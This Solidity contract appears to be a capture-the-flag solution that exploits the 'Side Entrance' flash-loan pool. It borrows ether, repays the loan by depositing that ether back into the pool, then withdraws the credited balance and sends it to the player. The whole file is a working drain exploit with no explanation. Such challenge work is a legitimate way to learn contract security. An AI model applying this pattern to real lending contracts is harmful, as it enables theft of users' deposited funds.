// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "../side-entrance/SideEntranceLenderPool.sol";


contract HackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address player;

    constructor(SideEntranceLenderPool _pool, address _player) {
        pool = _pool;
        player = _player;
    }

    function flashLoan(uint amount) public payable {
        pool.flashLoan(amount);
        pool.withdraw();
        player.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    fallback() external payable { }
}